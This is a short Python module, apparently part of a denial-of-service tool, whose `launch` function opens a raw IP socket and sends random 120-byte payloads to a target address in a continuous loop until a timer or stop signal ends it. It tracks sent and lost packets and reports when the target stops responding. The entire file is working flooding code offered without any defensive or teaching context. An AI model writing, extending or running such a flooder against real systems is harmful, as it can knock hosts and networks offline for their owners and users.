import socket
import os
import random
import time

def random_payload(size=120):
    return os.urandom(size)

def launch(target_ip, port, duration, tag, stop_event, fail_tracker):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except PermissionError:
        print(f"[!] {tag} requires admin/root privileges.")
        fail_tracker.append(tag)
        return

    sent = 0
    lost = 0
    start_time = time.time()

    while not stop_event.is_set():
        if duration and (time.time() - start_time > duration):
            break

        try:
            sock.sendto(random_payload(), (target_ip, 0))
            sent += 1
        except Exception:
            lost += 1

        if lost > 20:
            print(f"[x] {tag} target unresponsive or filtered.")
            fail_tracker.append(tag)
            break

    sock.close()
